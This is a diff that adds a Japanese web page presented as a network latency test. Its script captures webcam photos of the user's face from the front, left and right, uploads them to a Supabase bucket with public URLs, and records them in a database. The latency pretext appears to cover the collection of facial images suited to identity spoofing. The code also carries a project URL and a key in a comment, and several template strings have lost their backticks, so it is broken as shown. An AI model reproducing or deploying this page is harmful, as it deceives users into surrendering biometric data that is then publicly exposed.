@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>レイテンシー測定 ＆ フォトチェック 🌿</title>
+  <style>
+    :root {
+      --bg-color: #e8f5e9;
+      --card-bg: #ffffff;
+      --primary-color: #81c784;
+      --primary-hover: #66bb6a;
+      --accent-color: #a5d6a7;
+      --text-color: #2e7d32;
+      --subtext-color: #558b2f;
+      --border-radius: 20px;
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: "M PLUS Rounded 1c", "Hiragino Maru Gothic ProN", "Yu Gothic UI", sans-serif;
+    }
+
+    body {
+      background-color: var(--bg-color);
+      color: var(--text-color);
+      margin: 0;
+      padding: 20px 10px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background-color: var(--card-bg);
+      width: 100%;
+      max-width: 420px;
+      border-radius: var(--border-radius);
+      padding: 24px 20px;
+      box-shadow: 0 8px 24px rgba(46, 125, 50, 0.12);
+      border: 3px solid #c8e6c9;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 1.5rem;
+      margin-top: 0;
+      margin-bottom: 8px;
+      color: #2e7d32;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    p.subtitle {
+      font-size: 0.9rem;
+      color: var(--subtext-color);
+      margin-bottom: 20px;
+    }
+
+    .step-indicator {
+      display: inline-block;
+      background-color: #f1f8e9;
+      color: #33691e;
+      padding: 6px 16px;
+      border-radius: 20px;
+      font-weight: bold;
+      font-size: 0.95rem;
+      margin-bottom: 15px;
+      border: 1px solid #dedede;
+    }
+
+    .media-box {
+      position: relative;
+      width: 100%;
+      aspect-ratio: 4 / 3;
+      background-color: #f0f7f4;
+      border-radius: 16px;
+      overflow: hidden;
+      border: 2px dashed #a5d6a7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    video, canvas, img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .btn {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      padding: 14px 24px;
+      font-size: 1.05rem;
+      font-weight: bold;
+      border-radius: 30px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 20px;
+      box-shadow: 0 4px 10px rgba(129, 199, 132, 0.4);
+      transition: all 0.2s ease;
+    }
+
+    .btn:hover {
+      background-color: var(--primary-hover);
+      transform: translateY(-1px);
+    }
+
+    .btn:disabled {
+      background-color: #c8e6c9;
+      box-shadow: none;
+      cursor: not-allowed;
+    }
+
+    .results-card {
+      display: none;
+      margin-top: 20px;
+      padding: 16px;
+      background-color: #f1f8e9;
+      border-radius: 16px;
+      border: 1px solid #c8e6c9;
+      text-align: left;
+    }
+
+    .results-card h3 {
+      margin-top: 0;
+      color: #2e7d32;
+      font-size: 1.1rem;
+      text-align: center;
+    }
+
+    .ping-display {
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: #1b5e20;
+      text-align: center;
+      margin: 10px 0;
+    }
+
+    .preview-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 6px;
+      margin-top: 12px;
+    }
+
+    .preview-grid img {
+      width: 100%;
+      height: 80px;
+      border-radius: 8px;
+      border: 1px solid #a5d6a7;
+    }
+
+    .preview-grid p {
+      font-size: 0.75rem;
+      text-align: center;
+      margin: 2px 0 0 0;
+      color: var(--subtext-color);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>🌱 ネットワーク ＆ 顔角度チェック</h1>
+    <p class="subtitle">3つの角度から撮影して遅延（レイテンシー）を測定します</p>
+
+    <div id="stepIndicator" class="step-indicator">📸 ステップ 1/3：正面のお顔</div>
+
+    <div class="media-box">
+      <video id="webcam" autoplay playsinline></video>
+      <canvas id="canvas" style="display: none;"></canvas>
+    </div>
+
+    <button id="snapBtn" class="btn" onclick="takeStepPhoto()">写真を撮影する 🍃</button>
+
+    <div id="resultsCard" class="results-card">
+      <h3>✨ 測定 ＆ 送信結果</h3>
+      <div id="pingDisplay" class="ping-display">測定中...</div>
+      
+      <div class="preview-grid">
+        <div>
+          <img id="prevFront" alt="正面">
+          <p>正面</p>
+        </div>
+        <div>
+          <img id="prevLeft" alt="左側面">
+          <p>左側</p>
+        </div>
+        <div>
+          <img id="prevRight" alt="右側面">
+          <p>右側</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Supabase JS Client -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script>
+    // ----------------------------------------------------
+    // Supabase Configuration
+    // ----------------------------------------------------
+    const SUPABASE_URL = 'https://fcnuoymkjnpksqedodsb.supabase.co';
+    const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY'; //sb_publishable_PkfnJEQtRh8RApjDSJh_zA_efiQCc1A
+    const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    // DOM Elements
+    const webcam = document.getElementById('webcam');
+    const canvas = document.getElementById('canvas');
+    const snapBtn = document.getElementById('snapBtn');
+    const stepIndicator = document.getElementById('stepIndicator');
+    const resultsCard = document.getElementById('resultsCard');
+    const pingDisplay = document.getElementById('pingDisplay');
+    
+    const prevFront = document.getElementById('prevFront');
+    const prevLeft = document.getElementById('prevLeft');
+    const prevRight = document.getElementById('prevRight');
+
+    let currentStep = 0;
+    const stepTitles = [
+      "📸 ステップ 1/3：正面のお顔",
+      "📸 ステップ 2/3：左側のお顔",
+      "📸 ステップ 3/3：右側のお顔"
+    ];
+
+    let capturedBlobs = [];
+    let capturedDataURLs = [];
+
+    // Initialize Camera
+    async function initCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        webcam.srcObject = stream;
+      } catch (err) {
+        console.error("カメラのアクセスに失敗しました:", err);
+        alert("カメラへのアクセスを許可してください。");
+      }
+    }
+
+    // Step Capture Function
+    async function takeStepPhoto() {
+      const context = canvas.getContext('2d');
+      canvas.width = webcam.videoWidth || 320;
+      canvas.height = webcam.videoHeight || 240;
+      context.drawImage(webcam, 0, 0, canvas.width, canvas.height);
+
+      const dataURL = canvas.toDataURL('image/png');
+      capturedDataURLs.push(dataURL);
+
+      await new Promise((resolve) => {
+        canvas.toBlob((blob) => {
+          capturedBlobs.push(blob);
+          resolve();
+        }, 'image/png');
+      });
+
+      currentStep++;
+
+      if (currentStep < 3) {
+        stepIndicator.innerText = stepTitles[currentStep];
+        alert(撮影完了！次は【${stepTitles[currentStep].replace(/📸 ステップ \d\/\d：/, '')}】を撮影します。);
+      } else {
+        snapBtn.disabled = true;
+        snapBtn.innerText = "🔄 測定中 ＆ アップロード中...";
+        processAndUpload();
+      }
+    }
+
+    // Ping Measurement & Supabase Upload
+    async function processAndUpload() {
+      // Show Preview Images
+      prevFront.src = capturedDataURLs[0];
+      prevLeft.src = capturedDataURLs[1];
+      prevRight.src = capturedDataURLs[2];
+      resultsCard.style.display = 'block';
+
+      // 1. Measure Latency / Ping
+      const startTime = performance.now();
+      try {
+        await fetch(${SUPABASE_URL}/rest/v1/, { method: 'HEAD' });
+      } catch (e) {
+        console.log("Ping measure fallback");
+      }
+      const endTime = performance.now();
+      const pingMs = Math.round(endTime - startTime);
+
+      pingDisplay.innerText = 応答速度（レイテンシー）: ${pingMs} ms;
+
+      // 2. Upload Photos & Save Record
+      try {
+        const timestamp = Date.now();
+        const uploadedUrls = [];
+
+        const angles = ['front', 'left', 'right'];
+        for (let i = 0; i < 3; i++) {
+          const fileName = delay_${angles[i]}_${timestamp}.png;
+          const { error: uploadError } = await _supabase.storage
+            .from('delay-photos')
+            .upload(fileName, capturedBlobs[i]);
+
+          if (uploadError) throw uploadError;
+
+          const { data: { publicUrl } } = _supabase.storage
+            .from('delay-photos')
+            .getPublicUrl(fileName);
+
+          uploadedUrls.push(publicUrl);
+        }
+
+        // 3. Insert record into database
+        const { error: dbError } = await _supabase
+          .from('delay_tests')
+          .insert([
+            {
+              photo_front: uploadedUrls[0],
+              photo_left: uploadedUrls[1],
+              photo_right: uploadedUrls[2],
+              ping_ms: pingMs
+            }
+          ]);
+
+        if (dbError) throw dbError;
+
+        snapBtn.innerText = "✨ 送信が完了しました！";
+        stepIndicator.innerText = "🎉 すべてのステップが完了しました";
+
+      } catch (err) {
+        console.error("アップロードエラー:", err);
+        alert("データの送信に失敗しました: " + err.message);
+        snapBtn.disabled = false;
+        snapBtn.innerText = "再試行する 🍃";
+      }
+    }
+
+    window.addEventListener('DOMContentLoaded', initCamera);
+  </script>
+</body>
+</html>
